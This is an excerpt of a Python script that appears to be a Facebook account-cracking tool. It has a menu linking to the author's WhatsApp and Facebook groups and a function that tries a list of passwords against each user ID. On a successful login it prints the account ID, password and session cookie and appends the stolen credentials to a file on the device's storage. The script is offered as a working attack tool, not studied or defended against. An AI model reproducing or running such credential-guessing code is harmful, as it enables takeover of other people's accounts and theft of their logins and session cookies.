...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"}
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801884153077');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://chat.whatsapp.com/F8vt6rZ1UNUJ3MIkfvg0tT');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mTANJID\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [TANJID_VAI-💚] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/tanjid.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
